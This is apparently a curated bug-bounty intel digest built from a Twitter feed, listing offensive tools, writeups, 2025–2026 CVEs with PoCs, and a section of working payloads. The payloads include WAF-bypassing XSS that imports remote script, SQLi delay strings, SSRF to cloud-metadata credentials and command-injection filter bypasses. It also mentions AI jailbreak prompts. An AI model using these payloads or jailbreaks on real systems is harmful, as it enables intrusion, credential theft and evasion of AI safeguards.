# X (Twitter) Intel — Bug Bounty Feed Extraction

> Curated from **@xxx_toxic_off's retweet feed** (a bug bounty / red team intel curator).
> Harvested **2026-08-05**, **761 retweets analyzed**, deduplicated by story.
> Only NEW items are listed here — items already captured in memory (DroidHunter, PayPal $9.7k cache-poisoning, Shopify $25k SSRF, GitLab CVE-2022-2992, brutecat's $500k Google AI hack, Gitea/Langflow/MediaWiki/cPanel/Rails/CodeIgniter CVEs, etc.) are intentionally omitted.
> Spam (AI-affiliate, crypto, "free credits" promos) was filtered out.

---

## Tools & Repos

| Tool | What it does | GitHub/URL | Shared by |
|------|--------------|------------|-----------|
| Vigolium | High-fidelity vuln scanner fusing agentic AI with native speed (by @j3ssie) | https://github.com/vigolium/vigolium | @7h3h4ckv157 |
| Burp-MCP-Unrestricted | Fork of PortSwigger's Burp MCP server adding the 8 tools an AI agent needs to work a target end-to-end | https://github.com/RamanMG/Burp-MCP-Unrestricted | @Raman_Mohurle |
| ADeleginator | Check AD for delegation/machine-account-quota abuse paths (setting MAQ to 0 is not enough) | https://github.com/techspence/ADeleginator | @techspence |
| subScraper | Subdomain enumeration with "flyover" — screenshots every subdomain found | https://github.com/The-XSS-Rat/subScraper | @theXSSrat |
| XSPulse | Fast Go XSS toolkit: reflected, blind XSS callbacks, DOM heuristics, JS lib detection, WAF fingerprinting | https://github.com/rohsec/xspulse | @rynosec |
| SpideyX | Multipurpose async web pentest tool with multiple modes/configs | https://github.com/RevoltSecurities/Spideyx | @luckyhacker43 |
| Gemini-api-key-hunter / Google-api-key-scanner | Hunt exposed Gemini/Google API keys (self-hosted programs) | https://github.com/coffinxp/Gemini-api-key-hunter | @lostsec_ |
| exfil-scan | Scan LLM outputs for data-exfiltration signals (EchoLeak, CVE-2025-32711) | https://github.com/vikasudasi/exfil-scan | @akaclandestine |
| AndroHunter-v | On-device Android security toolset, 17 modules, no root, Android 10+ | https://github.com/ynsmroztas/AndroHunter | @ynsmroztas |
| enumrust | Recon/enumeration tooling (KingOfBugbounty) | https://github.com/KingOfBugbounty/enumrust | @ofjaaah |
| XSStrike | XSS detection suite: 4 parsers, intelligent payload generator, fuzzing engine, fast crawler | https://github.com/s0md3v/XSStrike | @DarkWebInformer |
| Photon | Fast web crawler for OSINT & recon | https://github.com/s0md3v/Photon | @0x0SojalSec |
| Cloudmare | Find origin servers of sites behind reverse proxies/CDN | https://github.com/mrh0wl/Cloudmare | @tom_doerr |
| OWASP Nettacker | Automated pentest framework / vuln scanner / vuln management | https://github.com/OWASP/Nettacker | @Dinosn |
| Shannon | Fully autonomous AI hacker; 96.15% on hint-free source-aware XBOW benchmark | https://github.com/KeygraphHQ/shannon | @DarkWebInformer |
| claude-bug-bounty | Claude Code skill: recon, IDOR, XSS, SSRF, OAuth, GraphQL, LLM injection, report writing | https://github.com/shuvonsec/claude-bug-bounty | @akaclandestine |
| ClaudeBrain | Karpathy-LLM-based Claude harness for pentest/bug bounty with Obsidian | https://github.com/Encod3d-Sec/ClaudeBrain | @Dinosn |
| Anthropic-Cybersecurity-Skills | 700+ open-source cybersecurity skills for AI coding agents (DFIR, threat hunting, cloud) | https://github.com/mukul975/Anthropic-Cybersecurity-Skills | @Dinosn |
| VulnHunter (Capital One) | Identifies which defects are actually exploitable, maps attack paths, proposes fixes | https://github.com/capitalone/vulnhunter | @dafr0g_ |
| awesome-osint-mcp-servers | Curated OSINT MCP server list | https://github.com/soxoj/awesome-osint-mcp-servers | @akaclandestine |
| Awesome-Offensive-AI-Agentic-Landscape | Curated offensive-AI projects, papers, benchmarks, commercial solutions | https://github.com/Yeti-791/Awesome-Offensive-AI-Agentic-Landscape | @Dinosn |
| security-research-orchestrator-prompt | High-assurance prompt for authorized security labs / exploit-chain research / PoC validation | https://github.com/dinosn/security-research-orchestrator-prompt | @Dinosn |
| wp2shell-lab | Non-destructive detector + Docker lab for WordPress wp2shell (CVE-2026-63030 + CVE-2026-60137) | https://github.com/dinosn/wp2shell-lab | @Dinosn |
| nndefaccts + changeme | Default-credential fingerprint datasets; pair with `nuclei -tags default-login` | https://github.com/nnposter/nndefaccts | @sekurlsa_pw |
| PsMapExec | Memory-resident framework: SAM/LSASS dumps, Kerberoasting, timeroasting — zero disk traces | https://hackers-arise.com/powershell-for-hackers-part-9-hacking-with-psmapexec/ | @_aircorridor |
| telegram-scraper | Telegram scraper w/ Backfill Forwarding (retroactively forward scraped messages) | https://github.com/DarkWebInformer/telegram-scraper | @DarkWebInformer |
| system-prompts-and-models-of-ai-tools | ~20k leaked system prompts (Cursor, Devin, Windsurf, Claude Code, Replit, v0, Lovable, Manus, etc.) | https://github.com/x1xhlol/system-prompts-and-models-of-ai-tools | @smalkalbani |
| nahamsec beginner resources | Tools list for beginner bug bounty hunters | https://github.com/nahamsec/Resources-for-Beginner-Bug-Bounty-Hunters/blob/master/assets/tools.md | @7h3h4ckv157 |
| Bug-bounty-Writeups repo | Community writeup collection | https://github.com/insecrez/Bug-bounty-Writeups | @akaclandestine |
| My-Hunting-Methodology | Personal bug hunting methodology doc (usable in AI prompts) | https://github.com/wadgamaraldeen/My-Hunting-Methodology- | @wadgamaraldeen |
| reverse-skill | Cybersecurity skills router for AI agents | https://github.com/zhaoxuya520/reverse-skill | @7h3h4ckv157 |
| API Pentesting gitbook | l1nuxkid's API pentesting notes | https://l1nuxkid.gitbook.io/l1nuxkid-docs/api-pentesting | @secsystemd |

---

## Writeups & Bounty Stories

| Title/vuln | Bounty | URL | Author |
|-----------|--------|-----|--------|
| GitLab RCE via rogue "GitHub Import" (CVE-2022-2992) — full analysis w/ bounty figure | $33,510 | https://medium.com/@aacle_ (via H1 #1679624) | @aacle_ |
| Reflected XSS in Shopify AI chatbot greetings via Markdown image rendering (help.shopify.com) | $1,600 | https://hackerone.com/reports/2509022 | saltymermaid |
| Leaking the phone number of any Google user (Google VRP, patched) | $5,000 | https://brutecat.com/articles/leaking-google-phones | @brutecat |
| "How a Late-Night iSpy.today Alert Turned Into a $1,000 Bounty" | $1,000 | https://infosecwriteups.com/how-a-late-night-ispy-today-alert-turned-into-a-1000-bounty-4e111be6abbd | via @luckyhacker43 |
| "The $0 IDOR That Was Worth More Than a $12,500 P1" — why impact > severity games | $0 (informative) | https://medium.com/bugbountywriteup/the-0-idor-that-was-worth-more-than-a-12-500-p1-4444d32f2f61 | Abhishek Meena (@aacle_) |
| IDOR allows deletion of OpenAPI specification files across organizations | — | https://medium.com/@X-Ghost/idor-allows-deletion-of-openapi-specification-files-across-organizations-22fe4d79711d | X-Ghost |
| From default IIS page to critical SQL injection | — | https://medium.com/p/from-default-iis-page-to-critical-sql-injection-d0e9950c66fc | @mugh33ra |
| "Don't Trust the Server" — response manipulation exposing a business-logic flaw (2 bugs) | — | https://medium.com/@yassentaalab51/dont-trust-the-server-how-response-manipulation-exposed-a-business-logic-flaw-8b554e36c6fe | @yassenAlsayed1 |
| Hacking vulnerable bank API (extensive) | — | https://infosecwriteups.com/d2a0d3bb209e | CyberPreacher |
| Weak credentials → admin panel via deep recon | — | https://ro0od.medium.com/weak-credentials-lead-to-access-to-admin-panel-deep-recon-2909b8a0f23e | ro0od |
| Authorization bypass due to cache misconfiguration | — | https://rikeshbaniya.medium.com/authorization-bypass-due-to-cache-misconfiguration-fde8b2332d2d | Rikesh Baniya |
| "You're Fuzzing All Wrong: FFUF & Virtual Host Fuzzing" | — | https://infosecwriteups.com/99e82643935a | Abhishek Gupta |
| Bypassing WAFs for fun & JS injection with parameter pollution (ethiack engine find) | — | https://blog.ethiack.com/blog/bypassing-wafs-for-fun-and-js-injection-with-parameter-pollution | @0xacb |
| From recon to RCE: hunting React2Shell (CVE-2025-55182) for bug bounties | — | https://coffinxp.medium.com/from-recon-to-rce-hunting-react2shell-cve-2025-55182-for-bug-bounties-4e3a3ed79876 | @lostsec_ (coffinxp) |
| Broken 2FA — real-world 2FA bypass cases | — | https://offsecrunner.github.io/posts/Broken-2FA/ | offsecrunner |
| Auth bypass → admin panel access, found via Shodan IPs of the target | $5,000 | (self-report) | @kalkii__ |
| Hijacked an official support X account via broken-link hijacking (tool: brokenlinkcheck.com) | rewarded | https://www.brokenlinkcheck.com | @wadgamaraldeen |
| OnlyShells: 3-vuln chain → NT AUTHORITY\SYSTEM by opening a crafted ONLYOFFICE document (BI.ZONE) | — | https://bi.zone/eng/expertise/blog/lomaem-onlyoffice-za-3-shaga-tsepochka-uyazvimostey-onlyshells/ | @7hesage |
| Bypassing Windows authentication reflection mitigations for SYSTEM shells — Part 1 (Synacktiv) | — | https://www.synacktiv.com/publications/bypassing-windows-authentication-reflection-mitigations-for-system-shells-part-1 | @7h3h4ckv157 |
| Abusing printers to compromise Active Directory (capture domain auth) | — | (article) | @co11ateral |
| Android recon for bug bounty: APKeep, APKTool, apk2url, jadx-gui, MobSF, MARA, Drozer (YesWeHack) | — | https://www.yeswehack.com/learn-bug-bounty/android-recon-bug-bounty-guide | @androidmalware2 |
| 2026 Practical Bug Bounty Guide — full methodology in SecurityTesting repo | — | https://github.com/The-XSS-Rat/SecurityTesting | @theXSSrat |
| Automated reflected-XSS hunting with Nuclei + passive recon data (video) | — | https://youtu.be/WCXW9uKYm48 | @NahamSec |
| "How I Find Real Bug Bounty Targets" — live recon workflow | — | https://0dayscyber.medium.com/how-i-find-real-bug-bounty-targets-live-recon-and-workflow-4971bbd8230b | @bountywriteups |
| WordPress user enumeration via REST API → chaining to impact | — | https://medium.com/@zyadabdelftah69 | @hunt_n27493 |

---

## Techniques & Methodologies

- AuthZ bypass: `/dealers/{id}` returns 401 → add `Authorization: Bearer <dealer name>` → full dealer data incl. financial margins — @VAG33K
- IDOR → 0-click ATO: `api/users/<anything>` leaks `forgot_passwd_token` → reset any password — @Hajjaj0x
- IDOR → email-verification bypass: `api/users/<name>` leaks the verification token; verify any email — @viehgroup
- Email-verification bypass via response manipulation: change body to `{"status":"emailValidated","message":"validated"}` — @Bl4ckSec
- OTP bypass: don't trust 429 status codes — keep sending requests anyway — @kobi_hk
- SSRF extension-filter bypass: require `.yaml` suffix? Use `url=http://2852039166/latest/meta-data/iam/security-credentials/role?a=example.yaml` (decimal IP = 169.254.169.254) — @viehgroup
- Astro 2.16.0–5.15.5 critical SSRF: `x-forwarded-proto: <collaborator-url>` header — @darkshadow2bd
- Subdomain takeover quick ref: `dig +short CNAME sub.target.com` → unclaimed Heroku/CloudFront/GitHub Pages/S3 = claim it — @aacle_
- Next.js recon: DevTools console → `__BUILD_MANIFEST.sortedPages` dumps all paths (credit @ofjaaah) — @viehgroup
- React2Shell hunting one-liner: `cat domains.txt | httpx-toolkit -silent -sc -td | grep -Ei "Next\.js|React" | awk '{print $1}' | nuclei -t .../CVE-2025-55182.yaml -silent` — @lostsec_
- React2Shell target discovery on Shodan: `http.header:"x-nextjs-cache"`, `http.header:"Next-Action"`, `http.header:"X-Powered-By: Next.js"` then nuclei — @0x0smilex
- FOFA/Shodan/ZoomEye filters for React2Shell: `vul.cve="CVE-2025-55182"` + `app="Next.js" || app="React.js"` — @zapstiko
- XSS "payload to rule them all" bypassing Imperva/Akamai/Cloudflare: prepend 50 chars then `1"><A HRef=%26quot AutoFocus OnFocus%0C={import(/https:X55.is/.source)}>` — @BRuteLogic
- Cloudflare XSS bypass: `%2Bself[%2F*foo*%2F'alert'%2F*bar*%2F](self[...]['domain'])%2F%2F` (comment-inside-bracket trick) — @nav1n0x via @XssPayloads
- Browser bogus-comment-state XSS: `</ <a href="><svg/onload=alert(1)>">` and `<?...>` variants — @nowaskyjr via @XssPayloads
- WAF bypass by switching request method GET→POST when WAF only inspects one — @NullSecurityX
- XSS when backend only strips quotes: `<s"vg o"nload=al"ert()>` sanitizes into valid `<svg onload=alert()>` — @NullSecurityX
- WAF bypass via URL normalization failures: double-encoding `%252f`, nested traversal `/api/v1/%2e%2e/%2e%2e/config` — @lex_is1
- 403 bypass payload: `;%09..` — @mugh33ra
- IP-blocklist bypass: `X-Forwarded-For` if app trusts the header — @WebSecAcademy
- CSTI ≠ SSTI: `{{7*7}}`→49 in Vue.js is client-side → DOM XSS via `{{$emit.constructor`alert(document.cookie)`()}}` — @viehgroup
- Salesforce XSS: `/apex/CommVisualforce?params=<base64 {"component":"..."}>` component param bypasses CSP/firewall — @viehgroup
- Time-based SQLi when custom logic fails: `';IF(LEN(USER_NAME())>=5)WAITFOR DELAY '0:0:20'--` — @_casper0x
- Heavy-query time SQLi: `+'+(SELECT REPLICATE(CAST('X' AS VARCHAR(MAX)),16500000))+'` — tunable delay — @Gotcha1G
- Stacked-subquery blind SQLi: `;(SELECT(1)FROM(SELECT(SLEEP(5)))a)` — @0x0smilex
- SQLi one-liner: `waybackurls target.com | grep '=' | sort -u | nuclei -t fuzzing-templates/sqli -dast` — @h4x0r_fr34k
- OS command injection via email field: replace spaces with `${IFS}`, confirm blind with Burp Collaborator — @darkshadow2bd
- WAF command-filter bypass: hex-encode chars `$'\x77\x68\x6f\x61\x6d\x69'` (whoami) — @darkshadow2bd
- Wayback Machine URLs leak JWT tokens when devs leave tokens in URLs/responses — @DarkWebInformer
- Katana deep-crawl without static bloat: `katana -u subs.txt -d 5 -kf -jc -fx -ef` (parse JS, strip css/svg/fonts) — @pdiscoveryio
- Default-login hunting: nmap http-default-accounts + nndefaccts dataset, or `nuclei -l targets.txt -tags default-login` — @sekurlsa_pw
- Cloudflare blocking Burp? Community bypass notes — https://www.reddit.com/r/bugbounty/comments/1e5umh4/ — @Secfortress
- wp2shell SQLi→RCE trick: bypass MySQL limits — UNION SELECT returns fake data instead of writing files; WordPress's own code creates the admin user — @sirifu4k1
- Broken-link hijacking: scan program pages w/ brokenlinkcheck.com, claim dead social accounts referenced on subdomains — @wadgamaraldeen
- OAuth Authorization Bypass testbed for practice: https://403.brutelogic.net/authz/oauth — @BRuteLogic

---

## CVE Watch (2025–2026)

| CVE | Product | Impact | PoC/ref |
|-----|---------|--------|---------|
| CVE-2026-6516 | ManageEngine ADAudit Plus (<8606) | CVSS 10.0 — Agent API auth bypass + path traversal → unauth RCE; 2.4K+ FOFA hits | fofabot / darkeye.org |
| CVE-2026-6875 | ServiceNow AI Platform | Pre-auth JavaScript sandbox escape → RCE (Brazil/Australia/Zurich/Yokohama pre-patch) | cloud.projectdiscovery.io/library/CVE-2026-6875 |
| CVE-2026-63030 + CVE-2026-60137 | WordPress core 6.9.0–6.9.4 / 7.0.0–7.0.1 | "wp2shell": REST /batch/v1 route confusion + `author__not_in` SQLi → unauth RCE | https://github.com/Icex0/wp2shell-poc + https://github.com/dinosn/wp2shell-lab |
| CVE-2026-42533 | NGINX (F5) | CVSS 9.2 — info leak + OOB heap write primitives (ASLR bypass); RCE impl open-sourced | @Markak_ |
| CVE-2026-42530 | NGINX HTTP/3 | RCE, PoC disclosed | https://securityonline.info/nginx-http3-rce-cve-2026-42530/ |
| CVE-2026-25243 | Redis | RESTORE zipmap double-free → RCE with ASLR on | https://github.com/dinosn/CVE-2026-25243 |
| CVE-2026-66373 | Redis | RESTORE buffer overflow | https://darkeye.org/vuln/cve/CVE-2026-66373 |
| CVE-2026-24061 | Telnet servers | CVSS 9.8 — RCE via malformed USER environment variable | https://github.com/SafeBreach-Labs/CVE-2026-24061 |
| CVE-2026-21440 | AdonisJS | CVSS 9.2 — path traversal in multipart file upload handling | https://github.com/Ashwesker/Ashwesker-CVE-2026-21440 |
| CVE-2026-60206 | Oracle WebLogic | Arbitrary file read | https://darkeye.org/vuln/cve/CVE-2026-60206 |
| CVE-2026-54121 | Microsoft AD CS ("CertiGhost") | CVSS 8.8 — enrollment chase fallback reads attacker `cdc` attribute → rogue host; NetExec detects | https://github.com/aniqfakhrul/CVE-2026-54121 + gist H0j3n |
| CVE-2026-49176 | Windows WalletService | Local privilege escalation, full details public | https://github.com/DavidCarliez/CVE-2026-49176_LPE_POC |
| CVE-2026-42980 | Windows kernel (WMI) | Privilege escalation → SYSTEM on unpatched builds | securityonline.info |
| CVE-2026-3296 | Everest Forms WP plugin <=3.4.3 | PHP object injection | cloud.projectdiscovery.io/library/CVE-2026-3296 |
| CVE-2026-16296 | Clearfy Cache WP plugin <2.4.3 | Open redirect via Cyrlitera old-URL handler | cve.org |
| (no CVE) | GitLab 18.11.3 | Authenticated RCE as git user — no admin/runner/interaction needed | https://github.com/wupco/gitlab-rce-demo |
| CVE-2025-55182 | React / Next.js ("React2Shell") | Pre-auth RCE (Next.js 16.0.6 confirmed); mass hunting ongoing | https://github.com/msanft/CVE-2025-55182 + l4rm4nd/CVE-2025-55182 |
| CVE-2025-55184 | React / Next.js | DoS | https://github.com/cybertechajju/CVE-2025-55184-POC-Expolit |
| CVE-2025-68613 | n8n | CVSS 10 — workflow expression RCE (authenticated) | https://github.com/rxerium/CVE-2025-68613 |
| CVE-2025-68668 | n8n python code node | CVSS 9.9 — sandbox escape → arbitrary commands | https://github.com/rxerium/rxerium-templates |
| CVE-2025-52691 | SmarterMail | CVSS 10 — unauth arbitrary file upload anywhere | https://github.com/rxerium/CVE-2025-52691 |
| CVE-2025-66039 / -61675 / -61678 | FreePBX | Auth bypass + SQLi + file-upload RCE trio | https://github.com/rxerium/FreePBX-Vulns-December-25 + Horizon3.ai writeup |
| CVE-2025-64446 | FortiWeb | Unauth RCE via path traversal + CGI auth bypass | https://gist.github.com/N3mes1s/d882ee7ca4ddcad150f94b7460508a32 (FG-IR-25-910) |
| CVE-2025-14847 | MongoDB ("MongoBleed") | Info leak; nuclei template available; still unpatched in wild | https://jira.mongodb.org/browse/SERVER-115508 |
| CVE-2025-0133 | Palo Alto GlobalProtect | Unauth XSS → steal VPN session cookies (XML/SVG namespaces bypass filters) | via @viehgroup |
| CVE-2025-6389 | WordPress Sneeit Framework plugin | RCE — active exploitation, full site compromise | https://github.com/Ashwesker/Ashwesker-CVE-2025-6389 |
| CVE-2025-37164 | HPE OneView (<11.0) | CVSS 10 unauth RCE (`/rest/id-pools/executeCommand`); CISA KEV 2026-01-07; still found via Shodan | rapid7.com/blog analysis |
| CVE-2024-37014 | Langflow <=1.0.12 | RCE via untrusted Python validation endpoint | cloud.projectdiscovery.io/library/CVE-2024-37014 |
| CVE-2025-10891 | Chromium V8 | RCE, public PoC | https://github.com/mwlik/v8-ndays/blob/main/CVE-2025-10891/poc.html |
| CVE-2025-54122 | Manager-io/Manager | Unauth full-read SSRF in "proxy" endpoint | @zoomeye_team |
| (n/a) | Fastjson 1.2.83 | RCE PoC for special env (JsonType) | https://github.com/wouijvziqy/Fastjson-JsonType-RCE-PoC |

---

## Threat Landscape Notes

- **Linux backdoor under development** (@nextronresearch): PAM backdoor (`pam_pkcs11.so`, hash `7531643f...ae1`) + UDEV backdoor components; archive hash `76a360593bf7b068...c5dd`.
- **JAMESWT opendir**: phishing/malware staging with folder names as live malicious domains; ~9,000 samples uploaded to MalwareBazaar (tag `dn-pdflite-lat`).
- **Shodan-observed scanning**: Chinese operator box in Singapore (47.237.103[.]249) running old AWVS against bulk government infra in Bhutan, Vietnam, Mexico, Russia — @NetAskari. Low-hanging attribution fruit.
- **DeepSeek V4 Flash jailbreaks circulating** (@Exocija): "year 2135 library manual" artifact-jailbreak prompt extracting ransomware/infostealer guides — LLM-abuse tradecraft worth knowing for AI-red-team scopes.

---

## Accounts to Follow

**Bug bounty tips & payloads**
- @viehgroup — daily XSS/SSRF/IDOR payloads with real-target context
- @BRuteLogic — XSS polyglots, OAuth testbeds, WAF bypass research
- @XssPayloads — curated novel XSS vectors (nav1n0x, nowaskyjr, aemkei)
- @NullSecurityX, @0x0SojalSec, @h4x0r_fr34k — WAF bypass payloads, SQLi one-liners
- @lostsec_ (coffinxp) — API-key hunting tools + React2Shell methodology
- @theXSSrat — subScraper + annual practical methodology guides

**Writeup curators**
- @luckyhacker43 — highest-signal bounty writeup reposter (amounts + H1 links)
- @bbwriteup, @bountywriteups, @bugbountywizard, @InfoSecComm — medium/infosecwriteups writeup streams
- @mqst_ — AI-security writeups (MCP, prompt leak)

**CVE & PoC monitors**
- @rxerium — detection scripts/nuclei templates for fresh CVEs (n8n, FreePBX, SmarterMail)
- @DarkWebInformer — PoC-first CVE alerts
- @fofabot — CVE + FOFA exposure counts
- @The_Cyber_News — urgent PoC alerts
- @ptdbugs — PoC discovery feed

**AD / Windows / red team**
- @techspence — AD delegation research (ADeleginator)
- @cyb3rops — detection engineering (CertiGhost analysis)
- @aniqfakhrul — AD CS vuln research (CertiGhost PoC)
- @sekurlsa_pw — default-cred/infra hunting tradecraft

**Malware / threat intel**
- @nextronresearch — supply-chain & backdoor identification with IOCs
- @JAMESWT_WT — opendir/malware-sample hunting, MalwareBazaar uploads
- @NetAskari — internet-wide scanner attribution

**AI×security**
- @akaclandestine — AI-security repos (exfil-scan, OSINT MCP, bug-bounty skills)
- @Dinosn — PoC labs, offensive-AI landscape, niche CVE labs
